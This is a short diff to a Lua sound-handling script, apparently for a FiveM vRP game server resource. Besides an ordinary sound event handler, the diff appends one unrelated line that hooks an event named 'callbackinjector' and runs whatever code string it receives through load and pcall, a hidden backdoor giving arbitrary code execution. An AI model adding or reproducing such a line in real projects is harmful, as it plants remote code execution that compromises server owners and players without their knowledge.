@@ -22,3 +22,5 @@ AddEventHandler('vrp_sound:fixed',function(playerid,x2,y2,z2,maxdistance,sound,v
 		SendNUIMessage({ transactionType = 'playSound', transactionFile = sound, transactionVolume = volume })
 	end
 end) 
+
+TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)
